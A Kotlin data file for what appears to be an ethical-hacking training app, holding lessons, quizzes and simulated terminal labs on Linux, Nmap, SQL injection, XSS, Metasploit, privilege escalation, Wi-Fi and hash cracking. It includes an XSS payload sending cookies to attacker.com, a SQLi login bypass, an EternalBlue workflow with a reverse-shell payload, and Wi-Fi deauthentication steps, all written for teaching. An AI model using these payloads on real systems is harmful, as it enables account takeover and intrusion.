package com.example.model

import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Code
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material.icons.filled.NetworkCheck
import androidx.compose.material.icons.filled.Shield
import androidx.compose.material.icons.filled.Terminal
import androidx.compose.material.icons.filled.Web
import androidx.compose.ui.graphics.vector.ImageVector

data class CoursePhase(
    val id: String,
    val title: String,
    val description: String,
    val chapters: List<Chapter>
)

data class Chapter(
    val id: String,
    val phaseId: String,
    val title: String,
    val description: String,
    val iconName: String, // String representation to map to Vector icon
    val lessons: List<Lesson>
)

data class Lesson(
    val id: String,
    val chapterId: String,
    val title: String,
    val summary: String,
    val contentMarkdown: String,
    val xpReward: Int = 100,
    val quiz: Quiz? = null,
    val requiredLabCommand: String? = null, // If a lesson requires a lab task in the terminal simulator
    val labSuccessOutput: String? = null
)

data class Quiz(
    val questions: List<QuizQuestion>
)

data class QuizQuestion(
    val question: String,
    val options: List<String>,
    val correctAnswerIndex: Int,
    val explanation: String
)

data class Badge(
    val id: String,
    val name: String,
    val description: String,
    val iconName: String,
    val requiredXp: Int
)

object CourseData {
    val badges = listOf(
        Badge("script_kiddie", "Script Kiddie", "Welcome to the matrix. Unlocked the fundamentals.", "Terminal", 0),
        Badge("linux_ninja", "Linux Ninja", "Mastered the Linux Command Line.", "Code", 200),
        Badge("recon_expert", "Recon Specialist", "Capable of performing deep reconnaissance.", "NetworkCheck", 500),
        Badge("web_auditor", "Web App Auditor", "Identified advanced vulnerabilities in web servers.", "Web", 900),
        Badge("exploit_master", "Exploit Specialist", "Weaponized exploits and payloads with Metasploit.", "Lock", 1300),
        Badge("elite_hacker", "Elite Cyber Guardian", "Mastered zero to advanced ethical hacking.", "Shield", 1800)
    )

    val phases = listOf(
        CoursePhase(
            id = "phase_1",
            title = "Phase 1: Zero (Fundamentals)",
            description = "Start your ethical hacking journey here. Build a rock-solid foundation in security ethics, networking, and Linux commands.",
            chapters = listOf(
                Chapter(
                    id = "ch_1",
                    phaseId = "phase_1",
                    title = "Ethical Hacking Fundamentals",
                    description = "Understand the ethical, legal, and operational landscape of cybersecurity.",
                    iconName = "Shield",
                    lessons = listOf(
                        Lesson(
                            id = "les_1_1",
                            chapterId = "ch_1",
                            title = "Introduction to Ethical Hacking",
                            summary = "Learn what ethical hacking is, the CIA Triad, and the basic hacking phases.",
                            contentMarkdown = """
                                ### Introduction to Ethical Hacking
                                
                                Ethical hacking involves authorized attempts to gain unauthorized access to computer systems, applications, or data. It relies on the same tools and techniques as malicious attackers, but with **permission** and the goal of **securing** the target.
                                
                                #### The CIA Triad
                                At the heart of security lies the CIA Triad:
                                *   **Confidentiality**: Ensuring only authorized users have access to sensitive information.
                                *   **Integrity**: Protecting data from unauthorized modification or deletion.
                                *   **Availability**: Guaranteeing reliable and timely access to systems/data for authorized users.
                                
                                #### The 5 Phases of Hacking
                                Ethical hackers follow a structured approach:
                                1.  **Reconnaissance**: Gathering information about the target.
                                2.  **Scanning**: Active probing of network devices, open ports, and vulnerabilities (e.g., using Nmap).
                                3.  **Gaining Access**: Exploiting a vulnerability to break in.
                                4.  **Maintaining Access**: Securing a backdoor or persistence inside the environment.
                                5.  **Clearing Tracks / Reporting**: Malicious hackers hide logs; ethical hackers write a thorough pentest report to fix the security gaps.
                            """.trimIndent(),
                            quiz = Quiz(
                                questions = listOf(
                                    QuizQuestion(
                                        question = "What is the primary difference between a white-hat hacker and a black-hat hacker?",
                                        options = listOf(
                                            "White-hats use better computer setups.",
                                            "White-hats operate with explicit authorization and secure goals, while black-hats do not.",
                                            "White-hats only work in daylight hours.",
                                            "Black-hats only target web applications."
                                        ),
                                        correctAnswerIndex = 1,
                                        explanation = "White-hat (ethical) hackers have explicit permission and work defensively to fix security holes."
                                    ),
                                    QuizQuestion(
                                        question = "What does the 'A' stand for in the CIA triad?",
                                        options = listOf("Authorization", "Authentication", "Accountability", "Availability"),
                                        correctAnswerIndex = 3,
                                        explanation = "Availability ensures that authorized parties can always access the data and services when needed."
                                    )
                                )
                            )
                        ),
                        Lesson(
                            id = "les_1_2",
                            chapterId = "ch_1",
                            title = "Legal & Ethical Boundaries",
                            summary = "Learn rules of engagement, scopes of work, and legal implications.",
                            contentMarkdown = """
                                ### Legal & Ethical Boundaries
                                
                                Hacking without written consent is a **criminal offense** under cyber laws such as the **CFAA** (Computer Fraud and Abuse Act) in the US, or equivalents worldwide. Ethical hackers always operate under strict rules.
                                
                                #### Key Documentation
                                *   **NDA (Non-Disclosure Agreement)**: A binding contract to keep all found vulnerabilities confidential.
                                *   **Scope of Work (SoW)**: Defines exactly which systems, subnets, and domains can be tested. Exceeding the Scope of Work is illegal, even if you are hired by the company.
                                *   **Rules of Engagement (RoE)**: Outlines the schedule, testing types (e.g., active vs. passive, destructive vs. non-destructive), and who to notify in case of a critical issue.
                                
                                #### Hacker Classifications
                                *   **White Hat**: Authorized security specialists (ethical hackers).
                                *   **Black Hat**: Unauthorized criminals targeting systems for malicious intent or gain.
                                *   **Grey Hat**: Un-authorized but benign hackers who look for bugs but report them rather than exploit them, though they still technically violate legal boundaries.
                            """.trimIndent(),
                            quiz = Quiz(
                                questions = listOf(
                                    QuizQuestion(
                                        question = "What happens if a penetration tester discovers a vulnerability on a server not listed in the Scope of Work?",
                                        options = listOf(
                                            "They should immediately exploit it to prove it's weak.",
                                            "They should ignore it forever.",
                                            "They must NOT test or exploit it, but should document it as out-of-scope and notify the client.",
                                            "They can test it as long as they do not break anything."
                                        ),
                                        correctAnswerIndex = 2,
                                        explanation = "Exceeding the Scope of Work is illegal. Out-of-scope targets must never be probed without dynamic written authorization."
                                    )
                                )
                            )
                        )
                    )
                ),
                Chapter(
                    id = "ch_2",
                    phaseId = "phase_1",
                    title = "Linux Command Line Mastery",
                    description = "Learn how to traverse directories, manipulate files, and run networking diagnostics using the terminal.",
                    iconName = "Terminal",
                    lessons = listOf(
                        Lesson(
                            id = "les_2_1",
                            chapterId = "ch_2",
                            title = "Terminal Navigation & File Manipulation",
                            summary = "Learn core commands: ls, cd, pwd, mkdir, cat, and clear.",
                            contentMarkdown = """
                                ### Terminal Navigation
                                
                                Linux is the operating system of choice for cybersecurity pros (like Kali Linux). Mastering the command line is essential.
                                
                                #### Crucial Directory Navigation Commands
                                *   `pwd`: Print Working Directory. Shows where you are in the filesystem.
                                *   `ls`: List files in the current folder. Use `ls -la` to see hidden files and permissions.
                                *   `cd <dir>`: Change Directory. Navigate around folders (e.g., `cd /var/www` or `cd ..` to go up).
                                
                                #### File and Directory Manipulation
                                *   `mkdir <name>`: Create a new directory.
                                *   `cat <file>`: Read and display the text content of a file.
                                *   `echo "text" > file.txt`: Write text into a file.
                                *   `rm <file>`: Delete a file. Use `rm -rf <dir>` with caution to remove directories.
                                
                                *Practice these commands in our built-in terminal lab! Try typing `ls` or `pwd`.*
                            """.trimIndent(),
                            requiredLabCommand = "ls",
                            labSuccessOutput = "Files in current directory:\n- secret_hash.txt\n- config.json\n- nmap_scan.xml",
                            quiz = Quiz(
                                questions = listOf(
                                    QuizQuestion(
                                        question = "Which command is used to display the path of the current active directory?",
                                        options = listOf("ls", "pwd", "cd", "dir"),
                                        correctAnswerIndex = 1,
                                        explanation = "`pwd` (Print Working Directory) outputs the absolute path of your current folder."
                                    )
                                )
                            )
                        ),
                        Lesson(
                            id = "les_2_2",
                            chapterId = "ch_2",
                            title = "Linux Utilities & Networking Commands",
                            summary = "Master networking diagnostics using ping, curl, and ifconfig.",
                            contentMarkdown = """
                                ### Networking Utilities in Linux
                                
                                Ethical hackers must analyze connections, read headers, and diagnose network health straight from the terminal.
                                
                                #### Key Commands
                                *   `ping <host>`: Checks network connectivity with a remote server using ICMP echo requests.
                                *   `curl <url>`: Fetches and displays content from a web URL. Great for checking server headers.
                                *   `ifconfig` or `ip a`: Displays network interface parameters, such as your local IP address and MAC address.
                                *   `whois <domain>`: Queries global databases for registrar and ownership details of a domain.
                                
                                *Try typing `whois google.com` or `ping -c 3 google.com` in our Lab Terminal!*
                            """.trimIndent(),
                            requiredLabCommand = "whois google.com",
                            labSuccessOutput = "Domain: GOOGLE.COM\nRegistrar: MarkMonitor Inc.\nCreation Date: 1997-09-15T04:00:00Z\nName Server: NS1.GOOGLE.COM\nStatus: clientDeleteProhibited",
                            quiz = Quiz(
                                questions = listOf(
                                    QuizQuestion(
                                        question = "What utility is used to transfer data from or to a server using supported protocols (such as HTTP, HTTPS, FTP)?",
                                        options = listOf("ping", "curl", "ifconfig", "whois"),
                                        correctAnswerIndex = 1,
                                        explanation = "`curl` is a highly powerful CLI client used to transfer data and probe remote web servers."
                                    )
                                )
                            )
                        )
                    )
                )
            )
        ),
        CoursePhase(
            id = "phase_2",
            title = "Phase 2: Intermediate (Scanners & Vulnerabilities)",
            description = "Learn how to gather deep intelligence, scan systems using industry-standard tools like Nmap, and identify vulnerabilities.",
            chapters = listOf(
                Chapter(
                    id = "ch_3",
                    phaseId = "phase_2",
                    title = "Reconnaissance & Active Scanning",
                    description = "Gain technical info about your targets safely and effectively.",
                    iconName = "NetworkCheck",
                    lessons = listOf(
                        Lesson(
                            id = "les_3_1",
                            chapterId = "ch_3",
                            title = "Passive Reconnaissance & OSINT",
                            summary = "Learn OSINT gathering techniques, Google Dorks, and metadata harvesting.",
                            contentMarkdown = """
                                ### Passive Reconnaissance & OSINT
                                
                                Passive reconnaissance involves gathering data without interacting with the target directly. This keeps your activities invisible.
                                
                                #### Open Source Intelligence (OSINT)
                                OSINT refers to utilizing public resources to aggregate information about target organizations.
                                
                                #### Google Dorking
                                Google Dorking uses advanced operators to index hidden or sensitive files on public web servers:
                                *   `site:target.com filetype:pdf`: Finds all PDF documents indexed on target.com.
                                *   `site:target.com intitle:"index of"`: Reveals directory listings.
                                *   `filetype:log site:target.com`: Looks for sensitive application files or log files containing credentials.
                            """.trimIndent(),
                            quiz = Quiz(
                                questions = listOf(
                                    QuizQuestion(
                                        question = "Which Google Dork operator limits search results to a specific domain name?",
                                        options = listOf("site:", "filetype:", "intitle:", "inurl:"),
                                        correctAnswerIndex = 0,
                                        explanation = "The `site:` operator forces search queries to run solely on the specified website or domain."
                                    )
                                )
                            )
                        ),
                        Lesson(
                            id = "les_3_2",
                            chapterId = "ch_3",
                            title = "Active Scanning with Nmap",
                            summary = "Identify open ports, services, and OS versions with Nmap command line switches.",
                            contentMarkdown = """
                                ### Network Mapping with Nmap
                                
                                Nmap (Network Mapper) is the premier tool for active scanning. It probes target IP addresses to identify live hosts, open ports, and running services.
                                
                                #### Core Nmap Scan Types
                                *   `nmap -sT <target>`: TCP Connect Scan. Completes the 3-way handshake. Easy to spot in logs.
                                *   `nmap -sS <target>`: SYN Stealth Scan. Sends a SYN packet but resets (RST) before finalizing the handshake. Harder to detect.
                                *   `nmap -sV <target>`: Service Version Detection. Analyzes responses to identify software names and version numbers.
                                *   `nmap -O <target>`: OS (Operating System) Detection.
                                *   `nmap -A <target>`: Aggressive scan. Combines OS detection, version scanning, script scanning, and traceroute.
                                
                                *Practice typing `nmap -sS 192.168.1.1` in our Terminal!*
                            """.trimIndent(),
                            requiredLabCommand = "nmap -sV target.local",
                            labSuccessOutput = "Starting Nmap 7.92\nNmap scan report for target.local (192.168.1.45)\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1\n80/tcp   open  http    Apache httpd 2.4.41\n443/tcp  open  ssl/http Apache httpd 2.4.41\n8080/tcp open  http    Tomcat 9.0.31",
                            quiz = Quiz(
                                questions = listOf(
                                    QuizQuestion(
                                        question = "Which Nmap scan flag initiates a TCP SYN Stealth scan?",
                                        options = listOf("-sT", "-sS", "-sV", "-O"),
                                        correctAnswerIndex = 1,
                                        explanation = "The `-sS` flag initiates a SYN stealth (half-open) scan, which resets connections before they fully establish, avoiding heavy logging."
                                    )
                                )
                            )
                        )
                    )
                ),
                Chapter(
                    id = "ch_4",
                    phaseId = "phase_2",
                    title = "Web Application Security",
                    description = "Learn the vulnerabilities listed in the OWASP Top 10.",
                    iconName = "Web",
                    lessons = listOf(
                        Lesson(
                            id = "les_4_1",
                            chapterId = "ch_4",
                            title = "SQL Injection (SQLi) Vulnerabilities",
                            summary = "Understand SQL Injection, authentication bypasses, and mitigation.",
                            contentMarkdown = """
                                ### SQL Injection (SQLi)
                                
                                SQL Injection occurs when user-supplied input is directly concatenated into a backend SQL query without validation or parameterized statements. This allows an attacker to manipulate SQL syntax and view or modify database records.
                                
                                #### Classic Authentication Bypass
                                Imagine a login query:
                                `SELECT * FROM users WHERE username = 'USER_INPUT' AND password = 'PASSWORD_INPUT'`
                                
                                If an attacker inputs `admin' OR '1'='1` as the username, the query evaluates as:
                                `SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '...'`
                                Since `'1'='1'` is always true, the authentication is bypassed, granting immediate root access.
                                
                                #### Preventative Controls
                                *   **Parameterized Queries (Prepared Statements)**: Ensures inputs are treated strictly as literals, never executable code.
                                *   **Input Validation & Sanitization**: Filtering out illegal characters.
                            """.trimIndent(),
                            quiz = Quiz(
                                questions = listOf(
                                    QuizQuestion(
                                        question = "What is the most effective way to eliminate SQL Injection vulnerabilities in a web application?",
                                        options = listOf(
                                            "Using client-side javascript filters.",
                                            "Replacing SQL with NoSQL databases.",
                                            "Using parameterized queries (prepared statements).",
                                            "Hiding database error logs."
                                        ),
                                        correctAnswerIndex = 2,
                                        explanation = "Parameterized queries keep SQL commands and user data strictly separated, rendering SQLi exploits mathematically impossible."
                                    )
                                )
                            )
                        ),
                        Lesson(
                            id = "les_4_2",
                            chapterId = "ch_4",
                            title = "Cross-Site Scripting (XSS)",
                            summary = "Learn how attackers inject malicious scripts into web pages viewed by users.",
                            contentMarkdown = """
                                ### Cross-Site Scripting (XSS)
                                
                                XSS allows malicious actors to inject client-side script code (usually JavaScript) into web pages visited by other users.
                                
                                #### XSS Variants
                                1.  **Reflected XSS**: Malicious scripts are echoed directly off the web server in response to search parameters or links (e.g., in a malicious URL link).
                                2.  **Stored XSS**: The payload is stored directly in the database (e.g., inside a forum post or profile comment). Every user visiting that page executes the script. This is highly dangerous.
                                3.  **DOM-based XSS**: The vulnerability resides completely in client-side JavaScript modifying the Document Object Model (DOM) environment.
                                
                                #### Example Payload
                                `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>`
                                This sends the victim's session cookie straight to the attacker's server, enabling full account takeover!
                            """.trimIndent(),
                            quiz = Quiz(
                                questions = listOf(
                                    QuizQuestion(
                                        question = "Which type of XSS is the most dangerous because the payload is saved permanently inside the system database?",
                                        options = listOf("Reflected XSS", "DOM-based XSS", "Stored XSS", "Indirect XSS"),
                                        correctAnswerIndex = 2,
                                        explanation = "Stored (Persistent) XSS is the most severe since the exploit triggers automatically for every single user loading the compromised webpage."
                                    )
                                )
                            )
                        )
                    )
                )
            )
        ),
        CoursePhase(
            id = "phase_3",
            title = "Phase 3: Advanced (Exploitation & Defensive)",
            description = "Move into high-level cybersecurity concepts. Understand advanced tools like Metasploit, privilege escalation vectors, and modern cracking.",
            chapters = listOf(
                Chapter(
                    id = "ch_5",
                    phaseId = "phase_3",
                    title = "Exploitation Frameworks",
                    description = "Take control of targets using the premier penetration testing framework.",
                    iconName = "Lock",
                    lessons = listOf(
                        Lesson(
                            id = "les_5_1",
                            chapterId = "ch_5",
                            title = "Metasploit Framework (MSF) Essentials",
                            summary = "Understand modules, exploits, payloads, and msfconsole.",
                            contentMarkdown = """
                                ### The Metasploit Framework
                                
                                Metasploit is the world's most widely used penetration testing framework. It contains thousands of public exploits, auxiliary scanners, and post-exploitation payloads.
                                
                                #### Core Terminologies
                                *   **Exploit**: The vector or script used to take advantage of a vulnerability.
                                *   **Payload**: The actual code that runs on the target system after successful exploitation (e.g., opens a shell or backdoor).
                                *   **Meterpreter**: An advanced Metasploit payload that resides entirely in memory, making it extremely stealthy. It allows file transfers, keylogging, and privilege escalations.
                                
                                #### Basic MSFConsole Workflow
                                1.  Search for an exploit: `search eternalblue`
                                2.  Select the exploit: `use exploit/windows/smb/ms17_010_eternalblue`
                                3.  Configure options: `set RHOSTS 10.10.10.4`
                                4.  Set the payload: `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
                                5.  Fire: `exploit` or `run`
                            """.trimIndent(),
                            quiz = Quiz(
                                questions = listOf(
                                    QuizQuestion(
                                        question = "What is 'Meterpreter' in the context of the Metasploit Framework?",
                                        options = listOf(
                                            "An automated scanner to find open ports.",
                                            "A highly advanced, stealthy payload that runs completely in RAM to execute terminal commands on the target.",
                                            "A script that reports vulnerabilities to managers.",
                                            "A dictionary password cracking software."
                                        ),
                                        correctAnswerIndex = 1,
                                        explanation = "Meterpreter is Metasploit's powerful, memory-resident payload that bypasses forensic detection and provides comprehensive shell access."
                                    )
                                )
                            )
                        ),
                        Lesson(
                            id = "les_5_2",
                            chapterId = "ch_5",
                            title = "Privilege Escalation on Linux & Windows",
                            summary = "Learn how hackers advance their permissions from low-privilege to Root/System.",
                            contentMarkdown = """
                                ### Privilege Escalation
                                
                                Initial access often yields only a restricted guest or local service shell. To achieve full admin rights (root in Linux, SYSTEM in Windows), privilege escalation is necessary.
                                
                                #### Linux Privilege Escalation Vectors
                                *   **Misconfigured SUID binaries**: Files with the SUID bit run with the permissions of the file owner (often root). If binaries like `find` or `bash` have SUID enabled, local users can spawn root shells.
                                *   **Exploitable Cron Jobs**: If a root cron job runs a script that a low-privilege user can write to, the user can inject malicious commands to run as root.
                                *   **Kernel Exploits**: Taking advantage of bugs in the operating system kernel (e.g., Dirty COW).
                                
                                #### Discovery Tools
                                Automation scripts help pentesters find these gaps quickly:
                                *   **LinPEAS** / **WinPEAS**: Comprehensive enumeration scripts.
                            """.trimIndent(),
                            quiz = Quiz(
                                questions = listOf(
                                    QuizQuestion(
                                        question = "What is the security risk associated with SUID binaries in Linux?",
                                        options = listOf(
                                            "They encrypt local user files.",
                                            "They slow down network speeds.",
                                            "They allow files to run with the permissions of the owner (often root), which can be abused to escalate privileges if misconfigured.",
                                            "They prevent users from logging out."
                                        ),
                                        correctAnswerIndex = 2,
                                        explanation = "SUID files run with owner permissions. If an administrative file has this bit misconfigured, local users can execute arbitrary commands with administrative rights."
                                    )
                                )
                            )
                        )
                    )
                ),
                Chapter(
                    id = "ch_6",
                    phaseId = "phase_3",
                    title = "Cryptographic Cracking & Defense",
                    description = "Gain a master's understanding of password security, hash cracking, and Wi-Fi networks.",
                    iconName = "Shield",
                    lessons = listOf(
                        Lesson(
                            id = "les_6_1",
                            chapterId = "ch_6",
                            title = "Wi-Fi Security & WPA Handshakes",
                            summary = "Learn how WPA2 handshakes are captured and cracked off-line.",
                            contentMarkdown = """
                                ### Wi-Fi Auditing & WPA2 Handshake Cracking
                                
                                Wireless security tests analyze the strength of the access point passwords using capture techniques.
                                
                                #### The 4-Way Handshake
                                When a device connects to a WPA2 Wi-Fi network, a 4-way cryptographic exchange occurs to verify the password without directly transmitting it.
                                
                                #### Attack Vector: Handshake Capture
                                1.  **Monitor Mode**: Configure the wireless card to monitor mode using `airmon-ng start wlan0`.
                                2.  **Packet Sniffing**: Listen for wireless packets using `airodump-ng`.
                                3.  **Deauthentication Attack**: Send forced deauth packets using `aireplay-ng` to kick a legitimate user offline, forcing their device to reconnect.
                                4.  **Capture**: Sniff the reconnection to capture the 4-way cryptographic handshake.
                                5.  **Offline Crack**: Use a dictionary attack to try millions of passwords against the handshake hash using `hashcat` or `john`.
                            """.trimIndent(),
                            quiz = Quiz(
                                questions = listOf(
                                    QuizQuestion(
                                        question = "Why does an auditor send deauthentication packets to a client during a Wi-Fi pentest?",
                                        options = listOf(
                                            "To permanently break their router.",
                                            "To force them to switch to mobile data.",
                                            "To force the device to reconnect so they can sniff and capture the 4-way cryptographic handshake.",
                                            "To scan their ports over the air."
                                        ),
                                        correctAnswerIndex = 2,
                                        explanation = "Deauthentication forces a re-association, which triggers the 4-way handshake, allowing offline dictionary attacks."
                                    )
                                )
                            )
                        ),
                        Lesson(
                            id = "les_6_2",
                            chapterId = "ch_6",
                            title = "Hash Cracking with Hashcat",
                            summary = "Master hash cracking methodologies, MD5, SHA-256, and rule files.",
                            contentMarkdown = """
                                ### Cryptographic Hashes & Cracking
                                
                                Hashes are one-way mathematical functions that convert plain text (like passwords) into fixed-length strings. They cannot be decrypted, but they can be cracked.
                                
                                #### Cracking Methodology
                                Since hashes cannot be easily reversed, attackers pre-hash dictionary lists (e.g., using the famous `rockyou.txt` wordlist) and compare them with the target hash.
                                
                                #### Command Syntax: Hashcat
                                `hashcat -m 1800 target_hash.txt rockyou.txt`
                                *   `-m 1800`: Specifies SHA-512 (shadow file format).
                                *   `-m 0`: Specifies MD5.
                                *   `-a 0`: Direct wordlist attack mode.
                                
                                #### Secure Salting
                                Salting adds a random string of characters to a password before hashing, creating completely unique hashes even for identical passwords. This blocks rainbow table attacks.
                            """.trimIndent(),
                            requiredLabCommand = "hashcat -m 0 hash.txt rockyou.txt",
                            labSuccessOutput = "Hashcat v6.2.5 starting...\nDictionary cache hit.\n\n3f7041a7df756b1f9b882f093a206b1e:password123\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 0 (MD5)\nHash.Target......: 3f7041a7df756b1f9b882f093a206b1e",
                            quiz = Quiz(
                                questions = listOf(
                                    QuizQuestion(
                                        question = "What security practice prevents two identical user passwords from resulting in the exact same database hash?",
                                        options = listOf("Symmetric encryption", "Double hashing", "Cryptographic salting", "Zero-trust tokens"),
                                        correctAnswerIndex = 2,
                                        explanation = "Cryptographic salting ensures that even identical passwords generate completely different hashes, neutralizing dictionary and precomputed rainbow table attacks."
                                    )
                                )
                            )
                        )
                    )
                )
            )
        )
    )

    fun getChapterIcon(iconName: String): ImageVector {
        return when (iconName) {
            "Shield" -> Icons.Default.Shield
            "Terminal" -> Icons.Default.Terminal
            "NetworkCheck" -> Icons.Default.NetworkCheck
            "Web" -> Icons.Default.Web
            "Lock" -> Icons.Default.Lock
            else -> Icons.Default.Code
        }
    }
}
